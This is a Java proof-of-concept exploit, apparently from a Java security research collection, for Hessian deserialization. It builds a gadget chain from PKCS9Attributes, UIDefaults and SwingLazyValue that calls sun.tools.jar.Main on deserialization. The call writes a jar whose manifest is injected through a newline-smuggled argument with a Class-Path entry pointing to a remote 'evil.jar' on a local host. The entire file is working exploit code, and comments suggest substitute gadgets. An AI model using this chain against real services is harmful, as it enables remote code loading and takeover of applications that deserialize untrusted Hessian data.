package com.javasec.pocs.hessian;

import com.javasec.utils.SerializeUtils;
import sun.security.pkcs.PKCS9Attribute;
import sun.security.pkcs.PKCS9Attributes;
import sun.swing.SwingLazyValue;

import javax.swing.*;

public class HessianProxyLVJarWrite {
    public static void main(String[] args) throws  Exception {
        //Pkcs9可以换成MimeTypeParameterList
        PKCS9Attributes pkcs9Attributes = SerializeUtils.createWithoutConstructor(PKCS9Attributes.class);
        UIDefaults uiDefaults = new UIDefaults();
        //PKCS9Attribute.EMAIL_ADDRESS_OID 是固定的，调试流程可以看到逻辑
        //SwingLazyValue can be replaced by UIDefaults.ProxyLazyValue;ProxyLazyValue can load class in lib when SwingLazyValue can only load class in jdk
        String classname = "sun.tools.jar.Main";
        String methodName = "main";
        Object[] evilargs = new Object[]{
                new String[] { "cfe", "E:\\exp.jar","aaaa\nClass-Path: http://127.0.0.1:8888/evil.jar", "E:\\1.txt" }
        };
        uiDefaults.put(PKCS9Attribute.EMAIL_ADDRESS_OID, new SwingLazyValue(classname,methodName,evilargs));
        SerializeUtils.setFieldValue(pkcs9Attributes,"attributes",uiDefaults);
        SerializeUtils.HessianDeserial(SerializeUtils.HessianTostringSerial(pkcs9Attributes));
    }
}
